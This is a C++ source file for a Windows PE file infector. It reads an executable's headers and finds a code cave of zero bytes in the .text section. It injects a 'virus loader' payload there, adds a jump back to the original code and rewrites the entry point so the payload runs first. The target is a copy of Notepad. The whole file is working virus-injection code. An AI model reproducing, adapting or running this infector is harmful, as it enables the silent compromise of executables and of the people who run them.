#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <stdio.h>
#include <iostream>
#include <string>
#include <vector>

#define CODE_SECTION_NAME ".text"
#define RELATIVE_JUMP_INSTRUCTION 0xE9
#define RELATIVE_CALL_INSTRUCTION 0xE8
#define SIZEOF_REL32_JUMP 5
#define SIZEOF_REL32_CALL 5
#define VIRUS_LOADER_PATH "../debug/virusloader"
#define EMPTY_SECTION_MARGIN 2

void analyzeEXE(const char* exePath);

int main()
{
    std::string exePath = "../debug/ogNotepad - copy.exe";
    // std::cout << "Enter exe path: ";
    // std::getline(std::cin, exePath);
    analyzeEXE(exePath.c_str());
}

void writeVirusLoader(FILE* exeFile, const char* virusLoaderPath, const std::vector<unsigned int>& externCallAddresses)
{
    FILE* virusLoader = fopen(virusLoaderPath, "r");
    if (!virusLoader)
    {
        printf("Can't open virus loader file\n");
        return;
    }

    int c = fgetc(virusLoader);
    int callCounter = 0, callIndex = 0;    // 5 times 0xE8 in a row indicates an extern call (without a valid address)
    while (c != EOF)
    {
        if (c == RELATIVE_CALL_INSTRUCTION)
            callCounter++;
        else
            callCounter = 0;
        if (callCounter == SIZEOF_REL32_CALL)
        {
            fseek(exeFile, -3, SEEK_CUR);
            fwrite(&externCallAddresses[callIndex++], sizeof(unsigned int), 1, exeFile);
            c = fgetc(virusLoader);
            continue;
        }
        // write next byte
        fputc(c, exeFile);
        c = fgetc(virusLoader);
    }

    fclose(virusLoader);
}

void analyzeEXE(const char* exePath)
{
    IMAGE_DOS_HEADER dosHeader;
    IMAGE_FILE_HEADER fileHeader;
    IMAGE_OPTIONAL_HEADER optHeader;
    IMAGE_SECTION_HEADER codeSectionHeader;

    FILE* file = fopen(exePath, "r+b");
    if (!file)
    {
        printf("Can't open file :(\n");
        return;
    }
    // extract pe format tables
    fread(&dosHeader, sizeof(IMAGE_DOS_HEADER), 1, file);
    
    if (dosHeader.e_magic != IMAGE_DOS_SIGNATURE)
    {
        printf("Invalid magic :(\n");
        return;
    }

    // jump and read file header, optional header
    fseek(file, dosHeader.e_lfanew + sizeof(DWORD), SEEK_SET);
    fread(&fileHeader, sizeof(IMAGE_FILE_HEADER), 1, file);
    fread(&optHeader, sizeof(IMAGE_OPTIONAL_HEADER), 1, file);

    fseek(file, fileHeader.SizeOfOptionalHeader - sizeof(IMAGE_OPTIONAL_HEADER), SEEK_CUR);
    // read section headers
    int sectionCount = 0;
    do
    {
        if(++sectionCount > fileHeader.NumberOfSections)
        {
            printf("Can't find code section (.text)\n");
            return;
        }
        // read header
        fread(&codeSectionHeader, sizeof(IMAGE_SECTION_HEADER), 1, file);
    } while (strcmp((char*)codeSectionHeader.Name, CODE_SECTION_NAME));

    // read code section and find unused sections
    int size = 0;
    int maxSize = -1;
    int overwriteRaw = 0;
    fseek(file, codeSectionHeader.PointerToRawData, SEEK_SET);
    for (int i = 0; i < codeSectionHeader.SizeOfRawData; i++)
    {
        unsigned char b;
        fread(&b, sizeof(unsigned char), 1, file);
        if (b == 0)
            size++;
        else
        {
            if (size > maxSize)
            {
                maxSize = size;
                overwriteRaw = codeSectionHeader.PointerToRawData + i - size + EMPTY_SECTION_MARGIN;
            }
            size = 0;
        }
    }
    maxSize -= EMPTY_SECTION_MARGIN + SIZEOF_REL32_JUMP;
    int overwriteVirtual = codeSectionHeader.VirtualAddress - codeSectionHeader.PointerToRawData + overwriteRaw;

    // inject virus loading code
    fseek(file, overwriteRaw, SEEK_SET);

    writeVirusLoader(file, VIRUS_LOADER_PATH, { 0x1234 });

    // write jump to original entry point
    fputc(RELATIVE_JUMP_INSTRUCTION, file);
    // jump = destination - source - instruction size
    long jump = optHeader.AddressOfEntryPoint - overwriteVirtual - SIZEOF_REL32_JUMP;
    fwrite(&jump, sizeof(long), 1, file);
    
    // change entry point
    optHeader.AddressOfEntryPoint = overwriteVirtual;
    // rewrite updated opt header
    fseek(file, dosHeader.e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER), SEEK_SET);
    fwrite(&optHeader, sizeof(IMAGE_OPTIONAL_HEADER), 1, file);
    
    fclose(file);
}